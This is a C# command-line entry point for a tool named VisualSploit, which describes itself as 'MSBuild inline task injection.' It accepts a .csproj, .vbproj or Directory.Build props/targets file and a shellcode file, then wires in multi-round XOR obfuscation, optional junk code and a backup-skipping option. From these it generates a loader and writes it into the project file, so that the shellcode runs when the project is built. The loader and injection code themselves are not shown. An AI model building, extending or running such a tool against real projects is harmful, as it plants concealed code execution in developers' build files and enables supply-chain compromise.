using System.CommandLine;

namespace VisualSploit;

class Program
{
    static int Main(string[] args)
    {
        var targetArg = new Argument<FileInfo>("target")
        {
            Description = "Target .csproj, .vbproj, Directory.Build.props, or Directory.Build.targets"
        };
        targetArg.Validators.Add(r =>
        {
            var target = r.GetValue(targetArg);
            if (target is null) return;
            var error = ValidateTargetFilename(target.Name);
            if (error is not null) r.AddError(error);
        });

        var shellcodeArg = new Argument<FileInfo>("shellcode")
        {
            Description = "Shellcode file (raw bytes or hex)"
        };
        shellcodeArg.AcceptExistingOnly();

        var outputOption = new Option<FileInfo?>("--output", "-o")
        {
            Description = "Output path (default: in-place)",
            HelpName = "path"
        };

        var noBackupOption = new Option<bool>("--no-backup")
        {
            Description = "Skip .bak when writing over an existing file"
        };

        var junkOption = new Option<bool>("--junk")
        {
            Description = "Interleave junk code"
        };

        var roundsOption = new Option<int>("-r", "--rounds")
        {
            Description = $"XOR rounds 1-{Config.MaxXorRounds}",
            DefaultValueFactory = _ => 3
        };
        roundsOption.Validators.Add(r =>
        {
            var v = r.GetValue(roundsOption);
            if (v < 1 || v > Config.MaxXorRounds)
                r.AddError($"XOR rounds must be between 1 and {Config.MaxXorRounds}");
        });

        var seedOption = new Option<int?>("-s", "--seed")
        {
            Description = "RNG seed for reproducibility"
        };

        var root = new RootCommand("MSBuild inline task injection.")
        {
            targetArg,
            shellcodeArg,
            outputOption,
            noBackupOption,
            junkOption,
            roundsOption,
            seedOption
        };

        Config BuildConfig(ParseResult ctx)
        {
            var target = ctx.GetValue(targetArg)!;
            var shellcode = ctx.GetValue(shellcodeArg)!;
            var output = ctx.GetValue(outputOption);
            var noBackup = ctx.GetValue(noBackupOption);
            var junk = ctx.GetValue(junkOption);
            var rounds = ctx.GetValue(roundsOption);
            var seed = ctx.GetValue(seedOption);

            return new Config(
                TargetPath: target.FullName,
                ShellcodePath: shellcode.FullName,
                OutputPath: output?.FullName,
                XorRounds: rounds,
                Seed: seed,
                Junk: junk,
                NoBackup: noBackup);
        }

        root.SetAction(parseResult =>
        {
            var cfg = BuildConfig(parseResult);
            try
            {
                var shellcode = Shellcode.Parse(cfg.ShellcodePath);
                var naming = new Naming(cfg.Seed);
                var inlineCode = Loader.Generate(shellcode, cfg, naming);
                MSBuild.Inject(inlineCode, cfg, naming);
                return 0;
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine($"Error: {ex.Message}");
                return 1;
            }
        });

        return root.Parse(args).Invoke();
    }

    static string? ValidateTargetFilename(string filename)
    {
        var ext = Path.GetExtension(filename);
        if (ext.Equals(".csproj", StringComparison.OrdinalIgnoreCase) ||
            ext.Equals(".vbproj", StringComparison.OrdinalIgnoreCase))
            return null;

        if (filename.Equals("Directory.Build.props", StringComparison.OrdinalIgnoreCase) ||
            filename.Equals("Directory.Build.targets", StringComparison.OrdinalIgnoreCase))
            return null;

        return "Target must be one of: *.csproj, *.vbproj, Directory.Build.props, Directory.Build.targets";
    }
}
